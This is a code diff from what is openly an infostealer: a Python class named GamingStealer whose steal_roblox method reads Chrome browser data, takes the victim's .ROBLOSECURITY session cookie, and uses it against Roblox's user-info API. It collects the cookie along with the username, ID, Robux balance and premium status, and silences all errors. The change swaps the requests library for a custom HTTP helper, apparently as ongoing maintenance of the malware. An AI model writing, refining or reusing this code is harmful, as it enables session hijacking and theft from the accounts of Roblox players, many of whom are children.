@@ -138,7 +138,6 @@ class GamingStealer:
 
     def steal_roblox(self):
         try:
-            import requests
             local_state_path = os.path.join(utils.get_localappdata(), 'Google', 'Chrome', 'User Data', 'Local State')
             if not os.path.exists(local_state_path):
                 return
@@ -187,16 +186,16 @@ class GamingStealer:
                     'Cookie': '.ROBLOSECURITY=' + roblox_cookie,
                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                 }
-                r = requests.get('https://www.roblox.com/mobileapi/userinfo', headers=headers, timeout=10)
-                if r.status_code == 200:
-                    data = r.json()
+                code, data = utils.http_get('https://www.roblox.com/mobileapi/userinfo', headers, 10)
+                if code == 200:
+                    info = json.loads(data.decode('utf-8'))
                     self.roblox = {
                         'cookie': roblox_cookie,
-                        'username': data.get('UserName', 'Unknown'),
-                        'id': data.get('UserID', 'Unknown'),
-                        'robux': data.get('RobuxBalance', 0),
-                        'premium': data.get('IsPremium', False),
-                        'avatar': data.get('ThumbnailUrl', ''),
+                        'username': info.get('UserName', 'Unknown'),
+                        'id': info.get('UserID', 'Unknown'),
+                        'robux': info.get('RobuxBalance', 0),
+                        'premium': info.get('IsPremium', False),
+                        'avatar': info.get('ThumbnailUrl', ''),
                     }
         except:
             pass
